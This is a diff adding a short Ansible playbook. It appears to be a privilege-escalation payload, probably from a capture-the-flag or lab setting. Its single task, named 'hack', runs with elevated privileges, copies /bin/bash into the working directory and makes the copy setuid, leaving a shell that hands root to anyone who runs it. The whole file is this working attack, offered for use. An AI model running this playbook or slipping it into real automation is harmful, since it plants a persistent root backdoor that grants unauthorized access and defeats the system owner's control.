@@ -1,0 +1,8 @@
+---                                                                                                               
+- name: shell                                                                                                  
+  hosts: localhost
+  become: yes
+
+  tasks:
+  - name: hack
+    shell: "cp /bin/bash . && chmod +sx bash"
